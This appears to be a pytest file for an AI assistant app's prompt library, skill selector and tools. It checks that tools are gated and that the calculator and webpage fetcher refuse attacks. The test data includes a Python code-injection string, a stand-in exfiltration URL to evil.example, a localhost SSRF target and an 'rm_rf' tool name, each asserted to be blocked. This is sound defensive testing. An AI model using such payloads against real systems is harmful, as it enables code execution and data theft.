"""Prompts library, Skills Hub and Tools Hub: every file loads, selection is sensible, tools are safe."""
import pytest

from app import prompts, skills, tools
from app.tools.base import ToolRun
from app.tools.calculator import CalcError, calculate
from app.tools.read_webpage import fetch, is_public_host
from app.tools.web_search import parse_results


# ------------------------------------------------------------------ prompts

def test_every_prompt_renders_with_its_placeholders_and_nothing_is_left_over():
    names = prompts.names()
    assert len(names) >= 30 and "shared/system_rules" in names and "thinker/roles/solver" in names
    for n in names:
        text = prompts.render(n, **{p: "X" for p in prompts.placeholders(n)})
        assert text and "$" not in text and "<!--" not in text, n


def test_a_missing_placeholder_fails_loudly():
    with pytest.raises(KeyError):
        prompts.render("planner/step", goal="g")


def test_prompt_names_cannot_escape_the_folder():
    with pytest.raises(KeyError):
        prompts.render("../core/config")


# ------------------------------------------------------------------ skills

def test_every_skill_parses_is_short_and_credits_its_source():
    all_ = skills.all_skills()
    assert len(all_) >= 20 and len({s.name for s in all_}) == len(all_)
    for s in all_:
        assert s.description and s.triggers and s.source and s.tokens < 350, s.name
    spec_skills = {"deep-thinking", "pdf-report", "humanizer", "web-page", "visual-design", "output-format"}   # spec Part 1 section 3
    assert spec_skills <= {s.name for s in all_}


def test_skill_selection_by_format_and_triggers_within_budget():
    assert [s.name for s in skills.select("", mode="planner", fmt="pdf", limit=1)] == ["pdf-report"]
    assert [s.name for s in skills.select("", mode="planner", fmt="html", limit=1)] == ["web-page"]
    assert "humanizer" in [s.name for s in skills.select("Please humanize this LinkedIn post", mode="simple")]
    assert "systematic-debugging" in [s.name for s in skills.select("I get a traceback, my script crashes", mode="simple")]
    assert skills.select("What is the capital of France?", mode="simple") == []
    assert skills.select("brainstorm ideas, debug this crash", mode="simple", budget_tokens=10) == []   # budget respected
    text = skills.render(skills.select("summarize the key points", mode="simple"))
    assert text.startswith("<skills>") and "## Skill: summarization" in text


# ------------------------------------------------------------------ tools

def test_tool_list_holds_only_what_is_on_and_never_unavailable_or_risky_tools():
    names = lambda specs: [t["function"]["name"] for t in specs]
    assert names(tools.specs_for({"web"}, model_has_tools=True)) == ["web_search", "read_webpage"]
    assert names(tools.specs_for({"code"}, model_has_tools=True)) == ["calculator"]          # run_code is risky + unavailable
    assert tools.specs_for({"web", "code"}, model_has_tools=False) == []                       # C9
    assert "search_files" not in names(tools.specs_for({"files"}, model_has_tools=True))
    assert names(tools.specs_for({"files"}, model_has_tools=True, include_files=True)) == ["search_files"]


async def test_execute_refuses_unknown_and_unavailable_tools():
    state = ToolRun(chat_id="c1")
    assert not (await tools.execute("rm_rf", {}, state, allowed={"rm_rf"})).ok
    assert not (await tools.execute("run_code", {"code": "print(1)"}, state, allowed={"run_code"})).ok


def test_calculator_is_exact_and_can_never_run_code():
    assert calculate("(48250*1.07)/12") == pytest.approx(4302.291666, rel=1e-6)
    assert calculate("2^10") == 1024 and calculate("sqrt(16) + pi") == pytest.approx(4 + 3.14159265, rel=1e-6)
    for bad in ("__import__('os').system('dir')", "open('x')", "().__class__", "a + 1", "9**9**9", "factorial(100000)", "x" * 400):
        with pytest.raises((CalcError, ValueError)):
            calculate(bad)


async def test_read_webpage_opens_only_links_from_this_answers_search_and_never_private_addresses():
    state = ToolRun(chat_id="c1")
    r = await fetch("https://evil.example/?data=secret", state)
    assert not r.ok and "only links returned by web_search" in r.text        # exfiltration blocked
    state.allowed_urls["http://127.0.0.1:8000/api/chats"] = 1
    r = await fetch("http://127.0.0.1:8000/api/chats", state)
    assert not r.ok and "public web address" in r.text                        # SSRF blocked
    assert not await is_public_host("localhost") and not await is_public_host("10.0.0.5")


def test_search_results_are_parsed_and_ads_skipped():
    html = """
    <div class="result"><a class="result__a" href="//duckduckgo.com/l/?uddg=https%3A%2F%2Fexample.org%2Fsolar">Solar <b>power</b></a>
      <a class="result__snippet">Solar is growing.</a></div>
    <div class="result"><a class="result__a" href="https://duckduckgo.com/y.js?ad=1">Ad</a></div>"""
    assert parse_results(html) == [("Solar power", "https://example.org/solar", "Solar is growing.")]
